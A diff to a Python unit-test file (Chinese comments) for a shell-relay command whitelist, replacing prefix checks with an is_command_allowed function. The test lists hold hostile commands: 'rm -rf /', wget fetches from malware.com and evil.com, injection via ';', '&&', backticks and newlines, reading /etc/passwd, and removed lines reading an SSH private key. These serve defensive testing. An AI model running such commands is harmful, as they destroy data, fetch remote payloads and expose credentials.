@@ -89,7 +89,7 @@ class TestSecurityWhitelist(unittest.TestCase):
 
     def test_allowed_commands(self):
         """测试允许的命令"""
-        from shell_relay import ALLOWED_PREFIXES
+        from shell_relay import is_command_allowed
         allowed_cmds = [
             "input tap 100 200",
             "input swipe 100 200 300 400",
@@ -100,71 +100,50 @@ class TestSecurityWhitelist(unittest.TestCase):
         ]
         for cmd in allowed_cmds:
             self.assertTrue(
-                any(cmd.startswith(p) for p in ALLOWED_PREFIXES),
+                is_command_allowed(cmd),
                 f"命令应该被允许: {cmd}"
             )
 
     def test_blocked_commands(self):
-        """测试被阻止的命令"""
-        from shell_relay import ALLOWED_PREFIXES
+        """测试被阻止的命令（白名单前缀无法覆盖的纯恶意命令）"""
+        from shell_relay import is_command_allowed
         blocked_cmds = [
             "rm -rf /",
-            "echo hacked > /system/etc/hosts",
             "wget http://malware.com/payload.sh",
-            "cat /data/data/com.termux/files/home/.ssh/id_rsa",
             "pm uninstall com.android.systemui",
+            "bash -c 'evil'",
+            "python3 -c 'import os; os.system(\"rm -rf /\")'",
         ]
         for cmd in blocked_cmds:
             self.assertFalse(
-                any(cmd.startswith(p) for p in ALLOWED_PREFIXES),
+                is_command_allowed(cmd),
                 f"命令应该被阻止: {cmd}"
             )
 
-
-class TestSecurityEdgeCases(unittest.TestCase):
-    """安全边界测试"""
-
     def test_command_injection_blocked(self):
-        """测试命令注入被阻止"""
-        from shell_relay import ALLOWED_PREFIXES
+        """测试命令注入被阻止（利用注入字符检测）"""
+        from shell_relay import is_command_allowed
         injection_cmds = [
             "input tap 100 200; rm -rf /",
             "input tap 100 200 && wget http://evil.com",
             "input tap 100 200 | cat /etc/passwd",
-            "$(rm -rf /)"
+            "$(rm -rf /)",
+            "input tap 100 200`whoami`",
+            "input tap 100 200\nrm -rf /",
         ]
         for cmd in injection_cmds:
             self.assertFalse(
-                any(cmd.startswith(p) for p in ALLOWED_PREFIXES),
+                is_command_allowed(cmd),
                 f"注入命令应该被阻止: {cmd}"
             )
-
-    def test_sensitive_file_access_blocked(self):
-        """测试敏感文件访问被阻止"""
-        from shell_relay import ALLOWED_PREFIXES
-        sensitive_cmds = [
-            "cat /data/data/com.termux/files/home/.ssh/id_rsa",
-            "cat /system/etc/hosts",
-            "head -100 /data/user/0/com.termux/files/home/.gitconfig",
-        ]
-        for cmd in sensitive_cmds:
-            # 这些命令以 cat/head 开头，在白名单里
-            # 但实际部署时可以加路径黑名单
-            is_allowed = any(cmd.startswith(p) for p in ALLOWED_PREFIXES)
-            # 记录：当前白名单允许 cat/head，这是设计上的权衡
-            # 如果需要更严格，可以加路径黑名单
-            self.assertTrue(is_allowed, f"当前白名单允许只读命令: {cmd}")
 
     def test_whitelist_prefix_matching(self):
         """测试白名单前缀匹配精确性"""
         from shell_relay import ALLOWED_PREFIXES
-        # 确保 "cat " 匹配 "cat file" 但不匹配 "catfish"
         self.assertTrue("cat /tmp/test".startswith("cat "))
         self.assertFalse("catfish".startswith("cat "))
-        # 确保 "echo " 匹配但不覆盖其他
         self.assertTrue("echo hello".startswith("echo "))
         self.assertFalse("echocardiogram".startswith("echo "))
-
 
 class TestConfigModule(unittest.TestCase):
     """测试配置加载模块"""
